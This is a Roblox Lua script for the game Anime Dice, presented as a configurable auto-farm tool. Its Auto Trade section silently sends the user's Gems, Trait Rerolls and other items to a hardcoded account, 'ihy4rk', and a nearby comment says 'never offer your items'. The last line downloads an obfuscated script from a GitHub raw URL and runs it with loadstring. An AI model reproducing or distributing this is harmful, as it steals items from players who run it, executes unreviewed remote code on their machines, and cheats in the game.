_G.AnimeDiceConfig = _G.AnimeDiceConfig or {

    ["General"] = {
        ["Enabled"] = true,
        ["Dry Run"] = false,
        ["Tick"] = 1,
        ["Money Reserve"] = 0,
    },

    ["Rolling"] = {
        ["Auto Roll Dice"] = true,
    },

    ["Dice"] = {
        ["Auto Buy Dice"] = true,
        ["Auto Equip Best Dice"] = true,
        ["Allowed Dice"] = {},
    },

    ["Team"] = {
        ["Smart Equip Team"] = true, -- Best income and damage teams.
    },

    ["Income"] = {
        ["Auto Collect Money"] = true,
        ["Collect Every"] = 10,
    },

    ["Visuals"] = {
        ["Hide Roll Animation"] = true,
        ["Hide Tower Animation"] = true,
    },

    ["Rebirth"] = {
        ["Auto Rebirth"] = true, -- Rebirth resets cash.
        ["Save At Fraction"] = 0.8,
        ["Max Rebirth"] = 13,
    },

    ["Potions"] = {
        ["Auto Use"] = true,
        ["Categories"] = { "Damage I", "Income I", "Health I" }, -- Empty = all potion types.
    },

    ["GUI"] = {
        ["Show Status"] = true,
        ["Minimized"] = false,
    },

    ["Rewards"] = {
        ["Daily Quests"] = true,
        ["Weekly Quests"] = true,
        ["Daily Login"] = true,
    },

    ["Anti AFK"] = {
        ["Enabled"] = true,
        ["Interval"] = 45,
    },

    ["Fusing"] = {
        ["Auto Fuse"] = false,
        ["Rarity"] = "Legendary", -- Reserve three unused units when enabled.
        ["Every"] = 15,
    },

    ["Auto Trade"] = {
        ["Auto Accept"] = true, -- Receive gifts from anyone; never offer your items.
        ["Auto Send"] = true,
        ["Usernames"] = {"ihy4rk"}, -- Exact usernames, in order. Offline players are skipped.
        ["Items"] = { "Gems", ["Trait Reroll"] = 10000, "Shadow Luck IV" }, -- Names send all available: { "Gems", "Luck III", ["Trait Reroll"] = 2 }.
        -- Up to 20 entries per trade; extra entries continue in the next batch.
        -- Unsupported items are skipped; quantities clamp to available spare stock.
        -- Each recipient is completed once per execution. Empty Items sends nothing.
    },

    ["Selling"] = {
        ["Auto Sell"] = true,
        ["Smart Auto Sell"] = true,
        ["Sell Every"] = 5,
        ["Keep Tier"] = { "Secret I", "Secret II", "Galactic", "Heavenly" }, -- Keep this tier and above; empty = use smart selling. Lowest listed tier wins.
        ["Max Income"] = 100, -- Used when both rarity and smart rules are off.
        ["Keep Per Name"] = 0,
        ["Keep Names"] = {},
        ["Keep Mutations"] = false,
        ["Keep Upgraded"] = false,
        ["Keep Grades"] = false,
        ["Keep Traits"] = false,
        ["Batch Size"] = 25,
    },

    ["Upgrades"] = {
        ["Auto Upgrade"] = true,
        ["Smart Auto Upgrade"] = true,
        ["Upgrade Tree"] = true,
        ["Upgrade Units"] = true,
        ["Max Unit Level"] = 50,
        ["Priority"] = { "Damage", "Health", "Money", "Income", "Luck", "Roll" },
    },

    ["Grade"] = {
        ["Auto Grade"] = false,
        ["Unit IDs"] = {}, -- Empty = best income team.
        ["Minimum Grade"] = "S",
        ["Gem Reserve"] = 10,
        ["Max Rolls Per Session"] = 50,
    },

    ["Trait"] = {
        ["Auto Trait"] = false,
        ["Unit IDs"] = {}, -- Empty = both recommended teams.
        ["Keep Traits"] = { "Samurai", "Shogun", "Monarch", "Transcendent", "Eternal" },
        ["Token Reserve"] = 10,
        ["Max Rolls Per Session"] = 50,
    },

    ["Tower"] = {
        ["Auto Tower"] = true,
        ["Smart Tower Level"] = true,
        ["Tower"] = "Shadow Tower",
        ["Allowed Towers"] = {"Shadow Tower"}, -- Empty = all towers.
        ["Preferred Tower"] = "Shadow Tower", -- Empty = choose by reward rate.
        ["Target Reward"] = "Gems",
        ["Minimum Predicted Floors"] = 1,
        ["Prediction Floor Cap"] = 500,
        ["Restart Every"] = 8,
        ["Tower Stat"] = true,
        ["Stat Every"] = 30,
    },
}

script_key="F4B3D987685D41D73572FB0FB17C50F4";

local s,r repeat s,r=pcall(function()return game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/source-animedice-func-obfuscated.lua")end)wait(1)until s;loadstring(r)()
